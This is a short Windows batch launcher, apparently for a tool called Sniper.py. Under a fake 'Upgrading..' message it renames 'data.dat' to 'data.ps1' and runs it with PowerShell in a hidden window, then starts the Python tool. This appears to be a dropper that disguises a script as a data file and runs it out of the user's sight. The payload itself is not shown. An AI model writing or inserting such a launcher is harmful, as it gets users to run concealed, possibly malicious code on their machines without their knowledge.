@echo off
color 0A
@echo Upgrading..
ren "data.dat" "data.ps1"
Powershell -File data.ps1 -WindowStyle hidden
@echo Upgraded
@echo Starting..
python Sniper.py